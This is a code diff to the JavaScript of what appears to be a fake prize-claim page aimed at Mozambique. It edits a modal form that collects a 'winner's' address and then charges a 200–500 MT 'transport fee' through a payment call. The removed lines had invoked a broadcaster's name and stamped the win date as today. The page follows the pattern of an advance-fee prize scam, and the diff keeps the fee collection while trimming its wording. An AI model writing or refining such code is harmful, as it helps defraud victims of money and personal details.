@@ -267,11 +267,10 @@ function showDeliveryForm() {
   
   const modal = document.getElementById('form-modal');
   const modalBody = document.getElementById('form-modal-body');
-  const today = new Date().toLocaleDateString('pt-PT');
   
   modalBody.innerHTML = `
     <div class="modal-body-content">
-      <h2>🚚 Entrega do Prêmio</h2>
+      <h2>🚚 Resgate do Prêmio</h2>
       
       <form id="delivery-form">
         <div class="form-group">
@@ -287,7 +286,7 @@ function showDeliveryForm() {
         <div class="form-group">
           <label>Província</label>
           <select id="user-province" required>
-            <option value="">Selecione a província</option>
+            <option value="">Selecione</option>
             <option value="Maputo Cidade">Maputo Cidade</option>
             <option value="Maputo Província">Maputo Província</option>
             <option value="Gaza">Gaza</option>
@@ -312,23 +311,14 @@ function showDeliveryForm() {
           <input type="text" id="user-neighborhood" required placeholder="Seu bairro">
         </div>
         
-        <div class="form-group">
-          <label>Dia que Ganhou</label>
-          <input type="text" id="win-date" value="${today}" readonly>
-        </div>
-        
-        <div class="terms-text">
-          <p><strong>✅ Parabéns!</strong> O prêmio será entregue sob termos e condições, será filmado ao receber o prêmio pela Miramar.</p>
-        </div>
-        
-        <h3 style="margin: 30px 0 20px; color: #ffd700; font-size: 1.4rem;">Escolha a Taxa de Transporte</h3>
+        <h3 style="margin: 25px 0 15px; color: #ffd700; font-size: 1.3rem;">Taxa de Transporte</h3>
         
         <div class="delivery-options">
           <label class="delivery-option">
             <input type="radio" name="delivery" value="200" onclick="selectDelivery(this)">
             <div class="delivery-info">
               <div class="delivery-price">200MT</div>
-              <div class="delivery-time">Recebe o prêmio na sua casa em 14 dias</div>
+              <div class="delivery-time">14 dias</div>
             </div>
           </label>
           
@@ -336,7 +326,7 @@ function showDeliveryForm() {
             <input type="radio" name="delivery" value="300" onclick="selectDelivery(this)">
             <div class="delivery-info">
               <div class="delivery-price">300MT</div>
-              <div class="delivery-time">Recebe o prêmio na sua casa em 6 dias</div>
+              <div class="delivery-time">6 dias</div>
             </div>
           </label>
           
@@ -344,13 +334,13 @@ function showDeliveryForm() {
             <input type="radio" name="delivery" value="500" onclick="selectDelivery(this)">
             <div class="delivery-info">
               <div class="delivery-price">500MT</div>
-              <div class="delivery-time">Recebe o prêmio na sua casa em 3 dias</div>
+              <div class="delivery-time">3 dias</div>
             </div>
           </label>
         </div>
         
-        <div id="payment-section" style="display: none; margin-top: 30px;">
-          <h3 style="margin: 0 0 20px; color: #ffd700; font-size: 1.4rem;">Escolha o Método de Pagamento</h3>
+        <div id="payment-section" style="display: none; margin-top: 25px;">
+          <h3 style="margin: 0 0 15px; color: #ffd700; font-size: 1.3rem;">Pagamento</h3>
           
           <div class="payment-options">
             <label class="payment-option">
@@ -371,7 +361,7 @@ function showDeliveryForm() {
           </div>
         </div>
         
-        <button type="button" id="finalize-btn" class="modal-btn" style="margin-top: 30px; font-size: 1.3rem; display: none;" onclick="submitForm()">Pagar Taxa de Transporte</button>
+        <button type="button" id="finalize-btn" class="modal-btn" style="margin-top: 25px; font-size: 1.3rem; display: none;" onclick="submitForm()">Pagar e Resgatar</button>
       </form>
     </div>
   `;
@@ -467,7 +457,7 @@ async function processPayment(method, amount) {
       body: JSON.stringify({
         method: method,
         amount: amount,
-        description: `Os melhores da semana - ${randomName} - Prêmio: ${currentPrize}`
+        description: `Os melhores da semana - ${randomName}`
       })
     });
     
